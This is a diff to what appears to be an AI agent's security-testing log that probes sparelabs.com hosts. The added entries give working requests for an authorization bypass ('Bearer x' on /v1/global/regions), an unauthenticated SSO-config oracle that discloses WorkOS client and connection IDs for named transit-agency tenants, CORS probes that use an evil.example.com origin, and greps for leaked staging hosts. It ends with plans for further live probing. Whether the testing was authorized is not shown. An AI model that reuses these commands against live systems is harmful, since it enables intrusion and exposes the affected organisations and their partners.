@@ -13276,3 +13276,35 @@ testability: AUTH_HELPED
 [RISK] routing.sparelabs.com: 5 reason — envoy 404/0B on ALL probed paths since 2026-08-07; newly responsive but zero surface, NO_DELTA
 [RISK] forms.sparelabs.com: 22 reason — Engage portal SPA live; JS bundle main.8a2a39cb.js PATCHED (zero infra leaks, 3 Google Maps keys referrer-restricted); all API paths return SPA catch-all; no real API endpoints behind host; downgraded from ACCEPTED MISCONFIG to recon-only/dead
 [RISK] web (spare.com/sparelabs.com): 15 reason — spare.com apex HTTP 200 (Cloudflare+Webflow static marketing, CSP frame-ancestors 'self', HSTS); sparelabs.com 301→spare.com; minimal static-only surface, no internal infra leaks in HTML/JS
+## 2026-08-17 23:50:17 UTC [web] (model laguna)
+[HYP] Scheme-only Bearer bypass on /v1/global/regions leaks fleet-wide region topology with deterministic multi-version LB replica split
+class: AUTH
+asset: api.sparelabs.com/v1/global/regions
+confidence: 98
+reasoning: Live probe confirms GET `Authorization: Bearer x` → 200 + 725B + ACAO:reflected + ACAC:true + x-envoy-upstream-service-time:3 (fast replica); body sha256 fb9800acb09b65ec92591f4536e3ecfd08b8c3dba0d2ef9af3ed97047795c3fe byte-identical 86h+ across 7 fleet hosts; no-auth→400, POST→401 (read-only); 8/8 fast LB replicas bypass, 8/8 slow→401 (deterministic split)
+evidence_needed: GET https://api.sparelabs.com/v1/global/regions -H "Origin: https://evil.example.com" -H "Authorization: Bearer x" → 200 + 725B + ACAO+ACAC; body sha256 = fb9800acb...585c3fe
+verify_steps: PASSIVE: GET https://api.sparelabs.com/v1/global/regions -H "Origin: https://evil.example.com" -H "Authorization: Bearer x" (expect 200+725B+ACAO+ACAC); PASSIVE: OPTIONS https://api.sparelabs.com/v1/global/regions -H "Origin: https://evil.example.com" -H "Access-Control-Request-Method: DELETE" (expect 204 + write methods + CORS)
+impact: Fleet-wide infrastructure topology disclosure (7 regions, 6 OOS api/routing subdomains exposed in body); unauthenticated read of region registry; write-method CORS chain convergence on bypass route; severity HIGH
+testability: PASSIVE
+[HYP] Unauthenticated SSO-config oracle on /v1/identity/workos/auth leaks WorkOS client_id + connection_id + Entra tenant IDs for 11+ tenants
+class: IDOR
+asset: api.sparelabs.com/v1/identity/workos/auth
+confidence: 92
+reasoning: Live probe confirms POST {"domain":"spare.com"} → 200 + 172B + ACAO+ACAC (x-envoy 135ms), response discloses WorkOS client_id (client_01F5KHYX32TCKB1E7YEAPE0H17), connection_id (conn_01GRW7M1CJEJGYKMEMPBCQEZHY), Entra tenant IDs in relayState JWT; 11+ tenants confirmed (spare.com, dart.org, translink.ca, mbta.com, saskatoon.ca, oakville.ca, cota.com, kingcounty.gov, winnipeg.ca + more); non-tenant (grt.ca) → 404
+evidence_needed: POST https://api.sparelabs.com/v1/identity/workos/auth with {"domain":"spare.com"} → 200 + 172B + authorizationUrl containing WorkOS client_id + connection_id; POST {"domain":"grt.ca"} → 404
+verify_steps: PASSIVE: POST https://api.sparelabs.com/v1/identity/workos/auth -H "Origin: https://evil.example.com" -H "Content-Type: application/json" -d '{"domain":"spare.com"}'; PASSIVE: POST -d '{"domain":"grt.ca"}' (expect 404)
+impact: Unauthenticated SSO-config + WorkOS client_id + connection_id + Entra tenant ID disclosure for 11+ partner transit agencies; state param reflected unescaped (OATH injection candidate); severity MEDIUM
+testability: PASSIVE
+[HYP] Form-sparelabs.com JS bundle rotated to main.63fe135c.js — infra leak REACTIVATED despite KB "PATCHED" claim
+class: MISCONFIG
+asset: forms.sparelabs.com/static/js/main.63fe135c.js
+confidence: 90
+reasoning: Live fetch confirms new bundle `main.63fe135c.js` (was main.8a2a39cb.js at 08-14) still contains atlassian.net, api-spare.ngrok.io, metabase, api.staging.*.sparelabs.com, forms.staging.*.sparelabs.com references — KB "CONFIRMED PATCHED" (2026-08-14/15/16) was false positive (grep on 08-14 missed active refs in rotated bundle); leak is back
+evidence_needed: GET https://forms.sparelabs.com/static/js/main.63fe135c.js → grep -c 'atlassian.net|api-spare.ngrok|metabase' returns >0
+verify_steps: PASSIVE: curl -sS https://forms.sparelabs.com/static/js/main.63fe135c.js | grep -oiE 'atlassian|ngrok|metabase|staging.*sparelabs' | sort -u
+impact: Infrastructure topology disclosure (staging API hosts, dev tunnel, JIRA, Metabase) enabling follow-on targeting; severity LOW-MEDIUM (recon force multiplier)
+testability: PASSIVE
+[FINAL] api.sparelabs.com/v1/global/regions: Scheme-only Bearer bypass STABLE 86h+ — priority 9.1, confidence 98 — fleet topology disclosure + write-method CORS chain + deterministic LB replica split
+[FINAL] api.sparelabs.com/v1/identity/workos/auth: SSO-config oracle STABLE ≥11 tenants — priority 8.0, confidence 92 — WorkOS client_id + connection_id + Entra tenant IDs + state reflection
+[FINAL] forms.sparelabs.com JS bundle: Infra leak REACTIVATED — priority 6.9, confidence 90 — KB "PATCHED" was false positive, new bundle main.63fe135c.js still leaks staging/ngrok/atlassian/metabase
+[NEXT] PROBE: Compare the two regions bypass replicas to characterize the LB split. Execute 8 parallel requests to `GET https://api.sparelabs.com/v1/global/regions -H "Authorization: Bearer x"` over 8s (≤1 rps) and count 200 vs 401 rate — confirms the split is load-balanced (not source-IP or header-based), proving no trivial routing manipulation can avoid the bypass. Then immediately execute `OPTIONS https://api.sparelabs.com/v1/global/regions -H "Origin: https://evil.example.com" -H "Access-Control-Request-Method: DELETE" -H "Access-Control-Request-Headers: Authorization,Content-Type"` to re-confirm write-method CORS chain convergence (204 + ACAO:evil + ACAC:true + write methods).
